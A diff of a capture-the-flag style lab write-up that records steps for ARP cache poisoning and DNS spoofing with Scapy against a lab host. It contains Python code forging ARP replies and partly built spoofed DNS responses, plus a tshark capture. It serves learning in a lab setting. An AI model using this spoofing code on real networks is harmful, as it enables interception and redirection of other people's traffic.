@@ -431,24 +431,24 @@ guest@d6fc16938bc6:~/pcaps$ tshark -nnr dns.pcap
 
 https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe112 
 
-- Step 10: 
-
-![](screenshots/arp-script-working-vars.png)
+- Step 10: Populate response values from 'packet' 
+	- Make a few small changes in order to redirect.
 
 ~~~
-        ether_resp = Ether(dst="4c:24:57:ab:ed:84", type=0x806, src="02:42:0a:06:00:03")
+        
+        ether_resp = Ether(dst=packet.hwsrc, type=0x806, src=macaddr)
 
-        arp_response = ARP(pdst="10.6.6.35")
-        arp_response.op = 2
-        arp_response.plen = 4
-        arp_response.hwlen = 6
-        arp_response.ptype = 0x0800
-        arp_response.hwtype = 1
+        arp_response = ARP(pdst=packet.psrc)
+        arp_response.op = 2 #change this to be a response
+        arp_response.plen = packet.plen
+        arp_response.hwlen = packet.hwlen
+        arp_response.ptype = packet.ptype
+        arp_response.hwtype = packet.hwtype
 
-        arp_response.hwsrc = "02:42:0a:06:00:03"
-        arp_response.psrc = "10.6.6.53"
-        arp_response.hwdst = "4c:24:57:ab:ed:84"
-        arp_response.pdst = "10.6.6.35"
+        arp_response.hwsrc = macaddr #provide my mac address
+        arp_response.psrc = "10.6.6.53" #provide IP sought by 10.6.6.35
+        arp_response.hwdst = packet.hwsrc
+        print(arp_response.hwdst)
 
         response = ether_resp/arp_response
 
@@ -457,19 +457,7 @@ https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe1
 
 - Step 11: Notice that the infected host is attempting to resolve a DNS query.
 	- **ftp.osuosl.org**
-- Step 12: Provide DNS response that sets my host as the IP for that domain. 
-	- Here is a nice resource to get started with that: 
-	- https://thepacketgeek.com/scapy/building-network-tools/part-09/
-- Step 13: Now getting arp to DNS query with what might be a response but I am not sure.
-~~~
-  248 242.720565643 10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
-  249 242.740753041 10.6.6.35 → 10.6.6.53    DNS 84 Standard query 0x0000 A 10.6.6.53
-~~~
-- Step 14: Keep Googling for resources -- need example of dns response.
-	- Here is a nice resource:
-	- https://www.programcreek.com/python/example/125964/scapy.all.DNSRR
-- Step 15: Did -V with tshark to get more details on DNS request so I can create response.
-	- Here is one "packet.summary" of the DNS request.
+- Step 12: Get summary of DNS request. Output of 'packet.summary'
 ~~~
 <bound method Packet.summary of <Ether  dst=02:42:0a:06:00:03 │Serving HTTP on 0.0.0.0 port 80 (http:
 src=4c:24:57:ab:ed:84 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 │//0.0.0.0:80/) ...
@@ -483,26 +471,24 @@ one ns=None ar=None |>>>>>
 
 
 - Step 16: Next challenge is to figure out how to grab the ephemeral port and respond to it. Along with any other fields we need for DNS response.
+
 ~~~
+ipaddr_we_arp_spoofed = "10.6.6.53"
+
 def handle_dns_request(packet):
-    request_port = packet.sport
-
-
-
     # Need to change mac addresses, Ip Addresses, and ports below.
+    
+
     # We also need
-    # need to replace mac addresses
-    eth = Ether(dst="4c:24:57:ab:ed:84", src="02:42:0a:06:00:03")
-    ip  = IP(dst="10.6.6.35", src="10.6.6.53")      # need to replace IP addresses
-    udp = UDP(sport=53,dport=request_port)          # need to replace ports
+    eth = Ether(src=packet.dst, dst=packet.src)       # switch src and dst mac addr
+    ip  = IP(dst=packet[IP].src, src=packet[IP].dst)  # switch src and dst ip addr
+    udp = UDP(dport=packet[UDP].sport, sport=53)      # switch src and dst ports
     dns = DNS(
         # MISSING DNS RESPONSE LAYER VALUES 
-        rd=1, qd=DNSQR(qtype="A", qname="ftp.osuosl.org"), an=DNSRR(rdata="10.6.6.53")
     )
     dns_response = eth / ip / udp / dns
     sendp(dns_response, iface="eth0")
 ~~~
-
 
 
 
